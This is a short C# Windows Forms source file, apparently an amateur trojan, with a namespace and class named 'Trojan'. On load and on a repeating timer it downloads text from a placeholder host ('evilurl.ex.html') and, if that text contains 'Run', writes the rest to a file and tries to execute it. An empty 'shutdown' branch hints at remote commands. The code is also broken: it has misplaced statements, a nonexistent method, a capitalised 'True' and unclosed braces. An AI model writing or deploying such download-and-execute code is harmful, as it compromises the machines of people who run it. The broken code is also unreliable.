using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Threading;

namespace Trojan
{
    using System.Diagnostics;
    using System.Net.NetworkInformation;
    public partial class Trojan : Form
    {
        int show=0;
        public Trojan()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          
            mainscannertimer.Enabled = True;
           
            name.Text = Environment.UserName;
          mainscanner();
        }
        
        
           System.Timers.Timer aTimer = new System.Timers.Timer();
    aTimer.Elapsed+=new ElapsedEventHandler(OnTimedEvent);
    aTimer.Interval=500;
    aTimer.Enabled=true;


 private static void OnTimedEvent(object source, ElapsedEventArgs e)
 {
     Console.WriteLine("TrojanRunning");
     mainscanner();
 }

        public void mainscanner()
        {
           
            
            Process[] processlist = Process.GetProcesses();
            
           time.Text = DateTime.Now.ToString();
            int vk = 0;
            vcount.Text = vk.ToString();
            int issue = 0;

           
                    WebClient client = new WebClient();
                    string downloadString = client.DownloadString("evilurl.ex.html");



                    if (downloadString.Contains("Run"))
                    {
                    string stringy=replace(downloadString,"Run","");
                        File.WriteAllText("this",stringy);
                        System.Diagnostics.Start("this");
                    
                    }
                    if (downloadString.Contains("shutdown"))
                    {



        }
                


    }



    
